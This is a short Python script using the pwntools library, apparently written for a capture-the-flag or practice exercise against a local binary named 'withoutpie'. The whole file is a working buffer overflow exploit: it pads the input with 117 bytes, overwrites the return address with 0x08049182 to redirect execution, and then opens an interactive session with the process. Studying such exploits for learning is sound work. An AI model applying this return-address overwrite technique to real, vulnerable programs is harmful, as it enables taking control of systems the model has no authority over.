from pwn import *

elf = load("withoutpie")

payload = b'A' * 117 + p32(0x08049182)
print(str(payload))

io = process(elf.path)
print(io.recvline())
io.sendline(payload)
# print(io.recvline())
io.interactive()
